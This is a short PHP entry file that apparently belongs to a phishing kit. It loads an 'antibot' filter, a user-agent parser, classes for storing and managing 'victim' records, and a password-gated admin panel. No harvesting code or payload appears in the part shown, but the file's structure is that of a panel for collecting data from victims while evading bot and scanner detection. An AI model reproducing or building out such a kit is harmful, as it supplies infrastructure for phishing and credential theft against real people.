<?php
require('config.php');

require('antibot.class.php');
require('useragent.class.php');

require('functions/admin.class.php');
require('functions/crud/victim.class.php');
require('functions/victim.class.php');

$crud = new VictimCRUD($pdo);
$victim = new Victim($pdo, $crud);

if(!empty($_SESSION['admin_pass']) && $_SESSION['admin_pass'] == ADMIN_PASS)
{
    $admin = new Admin($pdo, $crud);
}

$UserAgentParser = new UserAgentParser();